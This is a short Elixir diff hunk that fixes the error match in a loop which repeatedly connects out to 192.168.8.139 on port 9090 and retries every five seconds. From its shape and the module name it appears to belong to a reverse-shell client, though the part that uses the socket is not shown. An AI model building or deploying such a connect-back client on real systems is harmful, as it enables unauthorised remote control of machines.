@@ -3,7 +3,7 @@ defmodule Elixrs do
       case :gen_tcp.connect({192,168,8,139}, 9090, [:binary, active: false, send_timeout: 5000]) do
          {:ok, sock} -> 
             loop(sock)
-         {:error, Reason} ->
+         _ ->
             :timer.sleep(5000) 
             main()
       end
